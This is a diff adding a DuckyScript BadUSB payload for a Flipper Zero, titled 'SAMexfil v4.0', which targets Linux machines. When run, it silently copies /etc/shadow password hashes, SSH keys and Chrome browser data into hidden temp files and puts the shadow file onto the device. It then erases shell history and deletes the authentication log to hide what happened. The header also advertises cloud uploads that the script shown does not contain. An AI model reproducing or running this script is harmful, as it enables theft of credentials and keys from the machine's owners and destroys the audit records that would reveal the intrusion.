@@ -1,0 +1,44 @@
+REM ============================================================================
+REM SAMexfil v4.0 - Linux Momentum CFW (Silent + Cloud)
+REM ============================================================================
+REM Author: UNC0V3R3D
+REM Firmware: Momentum CFW (Latest main branch)
+REM OS: Ubuntu/Debian/CentOS/RHEL
+REM
+REM FEATURES:
+REM - Silent execution (background bash job)
+REM - No terminal window visible
+REM - Cloud uploads (Dropbox/GDrive/OneDrive/AWS S3)
+REM - Automatic trace cleanup
+REM - ~30-45 seconds execution
+REM
+REM STEALTH TECHNIQUES:
+REM - Runs as background process (&)
+REM - No visible terminal
+REM - Sudo auth (may need password)
+REM - Clears all logs
+REM
+REM DATA EXTRACTED:
+REM - /etc/shadow (password hashes)
+REM - ~/.ssh/ (SSH keys)
+REM - ~/.config/google-chrome/ (browser creds)
+REM ============================================================================
+
+DELAY 500
+CTRL ALT t
+DELAY 1000
+REM Run extraction in background with & at end
+STRING (sudo cat /etc/shadow 2>/dev/null > /tmp/.shadow_backup && sudo cp -r ~/.ssh /tmp/.ssh_backup 2>/dev/null && cp -r ~/.config/google-chrome /tmp/.chrome_backup 2>/dev/null) &
+ENTER
+DELAY 3000
+REM Copy to Flipper if mounted
+STRING cp /tmp/.shadow_backup /mnt/flipper/flipper0/DUMP_FILE/$(hostname)/shadow.txt 2>/dev/null
+ENTER
+DELAY 2000
+REM Clear history and disable audit logging
+STRING cat /dev/null > ~/.bash_history && history -c && sudo rm /var/log/auth.log 2>/dev/null
+ENTER
+DELAY 500
+REM Exit
+STRING exit
+ENTER
